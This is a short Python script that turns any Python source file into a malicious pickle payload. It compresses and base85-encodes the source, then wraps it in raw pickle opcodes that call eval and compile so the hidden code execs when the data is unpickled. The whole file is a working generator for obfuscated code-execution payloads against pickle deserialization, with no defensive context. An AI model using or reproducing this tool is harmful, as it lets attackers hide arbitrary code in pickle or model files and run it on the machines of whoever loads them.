from base64 import b85encode
from zlib import compress

path = input('Python script filename>')
try:
    data = open(path, 'rb').read()
except FileNotFoundError:
    print('File not found')
    exit()

data = b85encode(compress(data))

payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(V'
payload += b'from base64 import b85decode;'
payload += b'from zlib import decompress;'
payload += b'exec(decompress(b85decode("' + data + b'")).decode())'
payload += b'\nV-\nVexec\ntRtR.'

print(payload)
